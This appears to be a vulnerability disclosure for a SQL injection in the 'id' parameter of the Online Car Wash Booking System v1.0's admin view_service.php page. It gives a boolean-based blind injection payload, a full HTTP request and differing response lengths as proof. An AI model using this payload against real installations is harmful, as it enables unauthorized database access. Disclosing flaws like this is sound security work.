# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/admin/services/view_service.php?id=

Vulnerability location: /ocwbs/admin/services/view_service.php?id=, id

Current database name: ocwbs_db,length is 8

[+] Payload: /ocwbs/admin/services/view_service.php?id=2%27%20and%20length(database())%20=8--+ // Leak place ---> id

```sql
GET /ocwbs/admin/services/view_service.php?id=2%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close
```

When length (database ()) = 7, Content-Length: 856
![image](https://user-images.githubusercontent.com/54017627/169303030-f356f38b-36b5-448d-b1ce-4fa6bf45be8e.png)

![image](https://user-images.githubusercontent.com/54017627/169302761-fd52c379-0593-4ab7-8353-7c1c5d357755.png)

When length (database ()) = 8, Content-Length: 932
![image](https://user-images.githubusercontent.com/54017627/169303056-34d983d1-7631-433f-ab04-b5b13856eee2.png)

![image](https://user-images.githubusercontent.com/54017627/169302705-0dc67e32-11f6-4e4d-81e8-517eeaf725d4.png)
